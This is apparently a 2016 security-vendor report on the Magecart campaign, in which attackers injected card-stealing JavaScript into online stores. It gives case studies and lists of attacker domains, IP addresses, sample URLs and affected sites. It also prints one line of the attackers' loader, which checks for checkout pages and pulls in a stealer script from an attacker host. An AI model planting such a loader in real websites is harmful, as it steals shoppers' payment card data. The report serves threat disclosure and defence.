@@ -1,0 +1,272 @@
+Compromised E-commerce Sites Lead to “Magecart”
+Most methods used by attackers to target consumers are commonplace, such as phishing and the use of malware to target payment cards. Others, such as POS (point of sale) malware, tend to be rarer and isolated to certain industries. However, some methods are downright obscure—Magecart, a recently observed instance of threat actors injecting a keylogger directly into a website, is one of these.
+Since the widely publicized breach of Target Corporation, there has been a significant increase in awareness of activity surrounding POS (point of sale) system breaches. But web-based keylogger injection incidents continue to be little-known, even though they’ve been occurring for even longer than threats related to many high-profile breaches. 
+In 2000, the discovery of a vulnerability in versions of the widely-deployed Cart32 software, which enables consumers to shop online, gave threat actors access to the application as the administrator so they could dump credit card data and run commands on the hosting server. In 2007, discussions like this in the OSCommerce community illustrated more instances. Later in 2011, analysis showed additional mass compromise activity in OSCommerce pushing online store visitors to information-stealing malware. 
+Since then, this kind of activity increased, affecting other popular shopping cart software implementations. 
+In 2016, the trend continues. Numerous hacked e-commerce websites appear to be affected by a new compromise that injects JavaScript code into the site, which allows attackers to capture payment card information. RiskIQ has observed this campaign ranging back to at least March 2016, with new attacker infrastructure rolling out steadily since then. Public analysis of aspects of the activity was shared in June by Sucuri.
+RiskIQ has termed this set of credit card stealer activity “Magecart” for tracking purposes. Through analysis of data in RiskIQ Security Intelligence Services and RiskIQ’s PassiveTotal, we’ve discovered that, although somewhat similar to other active credit card stealer operations, Magecart is significant for a few reasons.
+Further insight into the functionality of the stealers observed in this campaign is available from ClearSky Cybersecurity. We thank them for their assistance in analyzing and disclosing this threat activity.
+An approximate timeline of observations from analyzed data provides the following insight:
+With RiskIQ’s crawling infrastructure, which captures the full sequence of events and page contents—including the Document Object Model (DOM), we can illustrate the operation of this campaign. The following sections present incidents on some affected websites.
+
+www.faber.co.uk
+
+In May 2016, RiskIQ observed the website of Faber and Faber, famed UK book publishing house, to be serving Magecart injections from their Magento site.
+Fig-1 Magecart-infected page on Faber’s website as seen in the RiskIQ Blacklist
+The injection in the source of the site can be seen with a simple addition of a script tag. When the injected web page on the merchant site is loaded, the malicious keylogger script is also loaded in the background. The keylogger script can access the browser session and submitted data.
+Fig-2 The Magecart script tag
+In this case, the attacker delivers the malicious credit card stealer script in two stages:
+1. The injected URL verifies that the page the site visitor is on is a checkout URL where cardholder data will be entered. In the delivered code, it is visible, for example, that the Firecheckout extension for Magento is targeted.
+2. If the test succeeds, the stealer script is loaded from the second stage script URL:
+if((new RegExp(‘onepage|checkout|onestep|firecheckout’)).test(window.location))
+{document.write(‘<script src=”https://jquery-cdn.top/mage.js”></script>’)};
+The resulting stealer script as served in this incident is shown below:
+Fig 3 – The stealer script as seen inside the RiskIQ tool
+The basic functionality of this script is to capture data from form fields and send the data to the remote URL using an AJAX call. Looking into the hosting for this attacker infrastructure, we see the following components active at the time:
+mageonline.net                       108.61.188.71
+jquery-cdn.top                       45.32.153.108
+45.32.153.108  AS20473 | US | AS-CHOOPA – Choopa LLC
+108.61.188.71  AS20473 | US | AS-CHOOPA – Vultr Holdings LLC
+Domain registration data (domain, registrant date, registrar, nameserver domain(s), registrant name and email):
+JQUERY-CDN.TOP  2016-05-09  PDR Ltd  bitcoin-dns.hosting  Ted  31338@mail.ru
+MAGEONLINE.NET  2016-05-16  PDR LTD. D/B/A PUBLICDOMAINREGISTRY.COM  bitcoin-dns.hosting  Gregory  braun.security@yandex.com
+The domain jquery-cdn.top may sound familiar to readers. In 2014 a threat actor group used the domain jquery-cdn.com in a series of attacks against websites, injecting malicious redirects into them to hijack visitor traffic to push victims to an instance of a crimeware exploit kit.
+https://www.riskiq.com/blog/labs/jquerycom-malware-attack-puts-privileged-enterprise-it-accounts-at-risk/
+This was a different attack campaign with different goals but illustrates a common technique in website hijacking where domain names and similar indicators are chosen with careful intent to allow attacker modifications and network traffic to blend in and avoid suspicion by onlookers. The names of popular JavaScript libraries is a common choice because of their presence on so many websites. A listing of Magecart domains and sampling of URLs is presented at the end of this report to illustrate how this concept influenced this attacker’s choice of naming their infrastructure.
+A short time later in the month, RiskIQ observed the attack site serving slightly modified payloads:
+Fig-4 The modified Magecart payload
+We believe this modification indicates work in progress on developing and enhancing the attacker’s code. You can see that commented sections were added to the file referencing form fields related to Braintree’s Magento module. Braintree is a payment processing service that may be snapped into the Magento platform to facilitate payment handling. The addition of this code may be an indication of the development and expansion of cardholder data targeting by the attacker.
+We also note that the bottom of the file also contains a call to console.log(), which aids the site visitor in debugging elements on the page. Verifying the victim e-commerce site, in this case, we note that the site indeed included Braintree-related JavaScript libraries. Opportunistic attackers may not always be able to predict the internals of how a compromised website handles details like payment processing and credit card handling. However, it’s likely that upon access to multiple victim websites, threat actors realized they needed to add additional support for the variety of services used in the e-commerce space, leading to this on-the-fly development.
+www.everlast.com
+
+Later in May, we identified that the main site of clothing/fitness powerhouse Everlast Worldwide, Inc. was compromised and abused to steal credit card data by the same threat actors.
+Fig-4 The URL of the stealer script is “everlast.js”
+As shown in the URL sequence from RiskIQ’s blacklist incident, the URL of the injected stealer script used the filename everlast.js., which may indicate that the attackers recognized a major brand at their disposal and took additional steps to attempt to have their malicious code blend in with site contents. This customization of script names to match victim sites is not common across much of the analyzed activity.
+Fig-5 The stealer code served in this instance is delivered in encoded or obfuscated form
+Like that observed in other reported activity, the stealer code served in this instance is delivered in encoded or obfuscated form. RiskIQ believes this to be a commodity script packer and we note that it is used various capacities by multiple threat actors (observed in malicious website code injections, malicious traffic redirectors, etc.). A portion of the resultant decoded script library is shown below:
+Fig-6 Some of the resultant decoded script library
+Stealer code:
+angular.club                         108.61.211.216
+108.61.211.216  AS20473 | US | AS-CHOOPA – Vultr Holdings LLC
+ANGULAR.CLUB  2016-05-15  PDR Ltd. d/b/a PublicDomainRegistry.com  bitcoin-dns.hosting  Gregory  braun.security@yandex.com
+In July, we observed another major fashion/lifecycle brand affected by the Magecart threat. The GUESS Australia online store was affected, and notably not implemented on Magento but rather Powerfront CMS.
+Fig-7 A modified stealer script
+As shown, the attacker appears to have adapted the name of the stealer script (/mage-asp.js) to, in part, reflect the technology on the underlying site—Powerfront CMS is implemented in ASP. 
+Stealer code:
+Fig-8 The stealer code inside shop.guesss.net.au
+Significant in this case is that sometime before staging this attack, hosting for the malicious stealer scripts shifted to a different network provider (Dataflow) known for high amounts of threat activity and noted to be a bulletproof hosting provider, servicing criminal customers on a dedicated basis.
+mage-js.link                 80.87.205.143
+80.87.205.143  AS203624 | RU | DATAFLOWSU – ICExpert Company Limited
+MAGE-JS.LINK  2016-06-09  Gandi SAS  gandi.net  Farid Zeynalov  abuse@dataflow.su
+More recently, on September 19, RiskIQ observed the Magento online store of fashion brand Rebecca Minkoff (apparel, handbags, and more) affected by Magecart.
+Fig-9 The RiskIQ Blacklist incident for Magecart in the Rebecca Minkoff site
+Stealer code:
+Fig-10 The stealer code for rebeccaminkoff.com
+js-syst.su                   80.87.205.145
+80.87.205.145  AS203624 | RU | DATAFLOWSU – ICExpert Company Limited
+JS-SYST.SU  2016-08-25  REGRU-REG-FID  reg.ru  –  rudneva-y@mail.ua
+RiskIQ notes a large portion of affected online merchants falling in the fashion and apparel category, believed to be in part because of the popularity of e-commerce in this space to extend storefronts to the Internet.
+As attackers focus on broadening capabilities to seize revenue opportunities, targets of cybercrime face an array of threats. e-commerce site owners must take every step necessary to secure their data and safeguard their payment card information. A bad experience at a retailer site may mean the loss of revenue as impacted users take their money elsewhere. Because Magecart affects websites deployed on commodity CMS and e-commerce software technology, the implementations of which may be outsourced by merchants to third parties, both merchants and integrators must take active roles in ensuring secure environments for deployed sites. Here is RiskIQ’s guidance:
+End users are also at significant risk as it is their payment data that is on the line when engaging in online sales. We recommend the following considerations for consumers:
+You can download the indicator files here and here.
+Attacker domains
+
+The following domains are observed serving malicious formgrabber code or are in some way closely related to observed domains (common hosting or other high-confidence reputational links). These domains were registered between March and August 2016:
+abuse-js.link
+angular.club
+cdn-js.link
+docstart.su
+govfree.pw
+jquery-cdn.top
+js-abuse.link
+js-abuse.su
+js-cdn.link
+js-link.su
+js-magic.link
+js-mod.su
+js-save.link
+js-save.su
+js-start.su
+js-stat.su
+js-sucuri.link
+js-syst.su
+js-top.link
+js-top.su
+jscript-cdn.com
+lolfree.pw
+mage-cdn.link
+mage-js.link
+mage-js.su
+magento-cdn.top
+mageonline.net
+mipss.su
+mod-js.su
+mod-sj.link
+sj-mod.link
+sj-syst.link
+stat-sj.link
+statdd.su
+statsdot.eu
+stecker.su
+stek-js.link
+syst-sj.link
+top-sj.link
+truefree.pw
+
+Attacker IP addresses
+
+The following IP addresses are observed hosting formgrabber domains or are in some way closely related to observed addresses (common hosting or other high-confidence reputational links). These domains were registered between March and August 2016. These IPs are provided with associated routing AS data indicating likely provider of hosting or Internet service:
+45.32.153.108  AS20473 | US | AS-CHOOPA – Choopa LLC
+46.151.52.238  AS203050 | RU | INTESTELLAR – PE Radashevsky Sergiy Oleksandrovich
+80.87.205.143  AS203624 | RU | DATAFLOWSU – ICExpert Company Limited
+80.87.205.145  AS203624 | RU | DATAFLOWSU – ICExpert Company Limited
+80.87.205.236  AS203624 | RU | DATAFLOWSU – ICExpert Company Limited
+104.238.177.224  AS20473 | US | AS-CHOOPA – Vultr Holdings LLC
+108.61.188.71  AS20473 | US | AS-CHOOPA – Vultr Holdings LLC
+108.61.211.216  AS20473 | US | AS-CHOOPA – Vultr Holdings LLC
+167.114.35.70  AS16276 | FR | OVH – OVH Hosting Inc.
+185.25.51.176  AS61272 | LT | IST – Informacines Sistemos Ir Technologijos UAB
+217.12.202.82  AS59729 | BG | ITL – ITL Company
+217.12.203.110  AS59729 | BG | ITL – ITL Company
+Sample URLs
+
+The following data consists of a set of sample Magecart URLs observed injected into affected websites, sorted by an observed date of occurrence:
+statsdot.eu/mage.js                    # 2016-05-06
+jquery-cdn.top/mage.js                 # 2016-05-22
+jquery-cdn.top/tmp.js                  # 2016-05-31
+mageonline.net/js/mage.js              # 2016-05-27
+angular.club/js/vanguardgear.js        # 2016-05-29
+angular.club/js/everlast.js            # 2016-05-30
+mage-js.link/mage-asp.js               # 2016-07-12
+cdn-js.link/cdn-js/mage.js             # 2016-07-25
+statsdot.eu/mag.js                     # 2016-08-14
+sj-syst.link/sj-syst/ocart.js          # 2016-08-16
+js-save.link/js-save/mage.js           # 2016-08-18
+mage-cdn.link/cp/mage.js               # 2016-08-18
+mage-cdn.link/mage.js                  # 2016-08-21
+mage-js.link/mage.js                   # 2016-09-04
+jscript-cdn.com/mage.js                # 2016-09-16
+js-syst.su/mage-script.php             # 2016-09-19
+Affected websites
+
+The following data provides a list of affected websites observed to be serving script injections to known Magecart content hosting and data collection hosts over the observed timeframe. This information is extracted from RiskIQ crawl sequences and presented in the form of host pairs through PassiveTotal, our solution for investigators and responders exploring the Digital Footprints of malicious actors.
+aufdemkerbholz.de
+backstage.gs
+eyeglass.com
+farmwholesale.com
+fidelitystore.com
+giftshop.cancerresearchuk.org
+gkboptical.com
+gypsyville.com
+ihomecases.com
+kerbholz.com
+lenshareca.com
+mamapanda.com
+mauriziocollectionstore.com
+sasshoes.com
+saudi.miniexchange.com
+shop.air-care.com
+shop.guess.net.au
+shop2.gzanders.com
+shoppu.com.my
+storeinfinity.com
+truthbookpublishersstore.org
+valuedrugs.net
+www.5thavenuedog.com
+www.aalens.com
+www.agssalonequipment.com
+www.apacwines.com
+www.arenaswimwearstore.com
+www.ariashop.co.uk
+www.arvaco.com
+www.aurigaeurope.com
+www.ausnaturalcare.com.au
+www.babysavings.com.au
+www.bellfieldclothing.com
+www.benmoss.com
+www.bogglingshop.com
+www.brandvapors.com
+www.brooktaverner.co.uk
+www.capstore.dk
+www.cbcrabcakes.com
+www.chefcentral.com
+www.clarke-distributing.com
+www.clickandgrill.de
+www.cottinfab.com
+www.countrywidehealthcare.co.uk
+www.crossingbroadstore.com
+www.dgpartsmall.com
+www.donnabeleza.com.br
+www.douglovesshirts.com
+www.eddymerckx.com
+www.emarket.com.kw
+www.evergreen.ie
+www.everlast.com
+www.faber.co.uk
+www.faberacademy.co.uk
+www.fidelitystore.com
+www.freedomflask.com
+www.ghurka.com
+www.gingerandsmart.com
+www.gkboptical.com
+www.golights.com.au
+www.grahamandgreen.co.uk
+www.greekpaddles.net
+www.huntingandfishing.co.nz
+www.iloveshowpo.com
+www.karity.com
+www.knetgolf.com
+www.kosherwine.com
+www.laploma.in
+www.leasevillenocredit.com
+www.lions-pride.com
+www.littlelittleorganics.com
+www.lostgolfballs.com
+www.mackenzieltd.com
+www.mcs.com
+www.minervabeauty.com
+www.miniexchange.com
+www.mothercare.co.id
+www.musclefood.com
+www.musingapore.cn
+www.muzzle-loaders.com
+www.mylook.ee
+www.nationalcargocontrol.com
+www.nessaleebaby.com
+www.nichecycle.com
+www.onesolestore.com
+www.owgartenmoebel.de
+www.ozeparts.com.au
+www.paykobo.com
+www.personalizationuniverse.com
+www.punkstuff.com
+www.rebeccaminkoff.com
+www.reservewineclub.com.sg
+www.retaildeal.biz
+www.rosesonly.com.sg
+www.royaldiscount.com
+www.santonishoes.com
+www.savannahcollections.com
+www.shopboss.com.br
+www.showpo.com
+www.shrimpandgritskids.com
+www.skinsolutions.md
+www.slimminglabs.com
+www.smoothmag.com
+www.sophieparis.com
+www.stagespot.com
+www.storeinfinity.com
+www.superbikestore.in
+www.surthrival.com
+www.thebeautyplace.com
+www.titanssports.com.br
+www.todaycomponents.com
+www.tonnotermans.nl
+www.ukbathroomstore.co.uk
+www.umnitza.com
+www.voicerecognition.com.au
+www.waterfilters.net
+www.wesellusedsound.co.za
+www.windsorsmith.com.au
+www.zalacliphairextensions.com.au
+Questions? Feedback? Email research-feedback@riskiq.net to contact our research team.
